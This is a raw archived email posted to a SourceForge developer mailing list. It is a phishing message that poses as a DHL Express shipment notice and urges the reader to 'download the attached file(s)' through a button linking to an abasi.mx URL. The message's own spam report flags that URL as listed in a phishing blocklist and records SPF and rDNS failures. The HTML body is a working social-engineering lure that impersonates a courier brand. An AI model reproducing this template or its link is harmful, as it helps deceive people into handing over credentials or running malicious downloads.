Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 6F11A68A7EA
	for <lists+industrypack-devel@lfdr.de>; Sat,  4 Feb 2023 03:57:29 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1pO8k4-0005TV-Sp
	for lists+industrypack-devel@lfdr.de;
	Sat, 04 Feb 2023 02:57:28 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <documentstrackin@dhl.com>) id 1pO8k2-0005TN-6B
 for industrypack-devel@lists.sourceforge.net;
 Sat, 04 Feb 2023 02:57:25 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=5fI867Xw4qFWvBrYQNO8yKwilrp5YrWUa2nrvIyPXFw=; b=mMnlpSw+X42mY7c+zu/7gQ6esV
 U9UD1O4k2GHiSb5HEXeQsNZ1dUvhoL4TxIJxEm4PGRMM2V5/3rvKGJid4gacr/+Ht5ZrmIQEuux9v
 qgexlhyFwB8kExwzX+hHDPos+fEuA43RJDAI1pFXyCqoAQ7A/2ASqs5DsrcvZfmVYLOE=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=5fI867Xw4qFWvBrYQNO8yKwilrp5YrWUa2nrvIyPXFw=; b=P
 lba6pLqrT5H4D5ewC0bVaBEm8+1yU7eT4JQFxUc7CUt2IhC2QwxX3SWRe82BtrOmZtmQE4zyNfpzt
 t7GdLNKEDm/wULy0rOyz8PjmUzoSFb7hrsxq+/BWI3U5V4aryZQzhp2HB4rBXhz65/E1iwRRW63gV
 q0wPT87jtNBcWfDU=;
Received: from [155.94.160.144] (helo=mail0.mapleleaf.com)
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1pO8k0-00Ajac-VM for industrypack-devel@lists.sourceforge.net;
 Sat, 04 Feb 2023 02:57:25 +0000
To: industrypack-devel@lists.sourceforge.net
Date: 04 Feb 2023 02:02:22 +0000
Message-ID: <20230204020222.04418653782758D7@dhl.com>
MIME-Version: 1.0
X-Spam-Score: 3.6 (+++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  DHL Express Dear industrypack-devel This is to notify you
 of a shipment that has been assigned to
 industrypack-devel@lists.sourceforge.net
 as the recipient To get tracking details of this shipment/receipts, please
 download the attached file(s) 
 Content analysis details:   (3.6 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 URIBL_PH_SURBL         Contains an URL listed in the PH SURBL blocklist
 [URIs: abasi.mx]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
 identical to background
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_FONT_SIZE_LARGE   BODY: HTML font size is large
 0.0 HTML_MESSAGE           BODY: HTML included in message
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 1.2 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
 only 0.0 NORDNS_LOW_CONTRAST    No rDNS + hidden text
X-Headers-End: 1pO8k0-00Ajac-VM
Subject: [Industrypack-devel] DHL On Demand Delivery
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: Shipping Doc via Industrypack-devel
 <industrypack-devel@lists.sourceforge.net>
Reply-To: Shipping Doc <documentstrackin@dhl.com>
Content-Type: multipart/mixed; boundary="===============0942950094920559630=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============0942950094920559630==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
w3.org/TR/html4/loose.dtd">

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<body style=3D"MARGIN: 0.5em">
<P>
<table style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif=
; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT=
: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LET=
TER-SPACING: normal; font-variant-ligatures: normal; font-variant-caps: nor=
mal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; te=
xt-decoration-style: initial; text-decoration-color: initial" height=3D"100=
%" cellspacing=3D"0" width=3D"100%" align=3D"center" bgcolor=3D"#ffbf00">
<TBODY>
<TR>
<td style=3D"MARGIN: 0px"><BR><BR>
<table align=3D"center">
<TBODY>
<TR>
<td style=3D"HEIGHT: 70px; WIDTH: 650px; MARGIN: 0px; BACKGROUND-COLOR: rgb=
(255,255,255); border-radius: 3px"><BR>
<table style=3D"WIDTH: 600px" cellspacing=3D"0" align=3D"center">
<TBODY>
<TR>
<td style=3D"MARGIN: 0px">
<table cellspacing=3D"0">
<TBODY>
<TR>
<td style=3D"MARGIN: 0px"><FONT color=3D#df0101 size=3D+3 face=3Dimpact><B>=
DHL Express</B></FONT></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE><=
/TD></TR>
<TR>
<td style=3D"HEIGHT: 7px; MARGIN: 0px"></TD></TR>
<TR>
<td style=3D"HEIGHT: 280px; WIDTH: 650px; MARGIN: 0px; BACKGROUND-COLOR: rg=
b(255,255,255); border-radius: 3px">
<table style=3D"WIDTH: 570px" cellspacing=3D"0" align=3D"center">
<TBODY>
<TR>
<td style=3D"MARGIN: 0px">
<table cellspacing=3D"0">
<TBODY>
<TR>
<td style=3D"MARGIN: 0px"><FONT color=3D#000 size=3D2 face=3D"Arial, Helvet=
ica, sans-serif">Dear industrypack-devel</FONT><BR><BR><FONT color=3D#000 s=
ize=3D2 face=3D"Arial, Helvetica, sans-serif">This is to notify you of a sh=
ipment that has been assigned to industrypack-devel@lists.sourceforge.net a=
s the recipient</FONT><BR><BR><FONT color=3D#000 size=3D2 face=3D"Arial, He=
lvetica, sans-serif">To get tracking details of this shipment/receipts, ple=
ase download the attached file(s)<BR></FONT></TD></TR>
<TR>
<td style=3D"HEIGHT: 10px; MARGIN: 0px"></TD></TR>
<TR>
<td style=3D"MARGIN: 0px">
<table style=3D"HEIGHT: 30px; WIDTH: 230px; BACKGROUND-COLOR: rgb(223,1,1);=
 border-radius: 2px">
<TBODY>
<TR>
<td style=3D"MARGIN: 0px">
<DIV align=3Dcenter><A style=3D"COLOR: rgb(17,85,204); text-decoration-line=
: none" href=3D"https://www.abasi.mx/uytr/dhl/?i=3Di&amp;0=3Dindustrypack-d=
evel@lists.sourceforge.net" target=3D_blank data-saferedirecturl=3D"https:/=
/www.google.com/url?q=3Dhttp://0.0.0.0/&amp;source=3Dgmail&amp;ust=3D167555=
5242717000&amp;usg=3DAOvVaw3Fy8_xOLbQ1du5kpnBRz75"><FONT color=3D#ffffff><B=
>Download the attached copy of your Tracking details/receipt(s).</B></FONT>=
</A></DIV></TD></TR></TBODY></TABLE></TD></TR>
<TR>
<td style=3D"HEIGHT: 5px; MARGIN: 0px"><B><FONT size=3D1 face=3D"georgia, s=
erif">NOTE: PRINT AND KEEP DOCUMENT(S) SAFE TILL YOUR DELIVERY ARRIVES.</FO=
NT></B></TD></TR>
<TR>
<td style=3D"MARGIN: 0px">
<HR style=3D"WIDTH: 460px" align=3Dleft>
</TD></TR>
<TR>
<td style=3D"HEIGHT: 5px; MARGIN: 0px"></TD></TR>
<TR>
<td style=3D"MARGIN: 0px"><FONT color=3D#000 size=3D2 face=3D"Arial, Helvet=
ica, sans-serif"><B><FONT color=3D#df0101>Shipment Recipient:</FONT></B>=20=

<UL>
<LI>This shipment can be cleared only by: industrypack-devel@lists.sourcefo=
rge.net</LI></UL></FONT></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE=
></TD></TR>
<TR>
<td style=3D"HEIGHT: 10px; MARGIN: 0px"></TD></TR>
<TR>
<td style=3D"HEIGHT: 20px; WIDTH: 650px; MARGIN: 0px; BACKGROUND-COLOR: rgb=
(223,1,1); border-radius: 3px">
<table style=3D"WIDTH: 600px" cellspacing=3D"0" align=3D"center">
<TBODY>
<TR>
<td style=3D"MARGIN: 0px"><FONT color=3D#fff size=3D2 face=3D"Arial, Helvet=
ica, sans-serif"></FONT></TD></TR></TBODY></TABLE></TD></TR>
<TR>
<td style=3D"HEIGHT: 0px; MARGIN: 0px"></TD></TR>
<TR>
<td style=3D"HEIGHT: 35px; WIDTH: 650px; MARGIN: 0px; border-radius: 3px">
<DIV align=3Dcenter><FONT color=3D#fff size=3D2 face=3D"Arial, Helvetica, s=
ans-serif"><B>DHL Express Worldwide</B></FONT></DIV></TD></TR></TBODY></TAB=
LE><BR><BR><BR></TD></TR></TBODY></TABLE></P></BODY></HTML>


--===============0942950094920559630==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============0942950094920559630==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============0942950094920559630==--
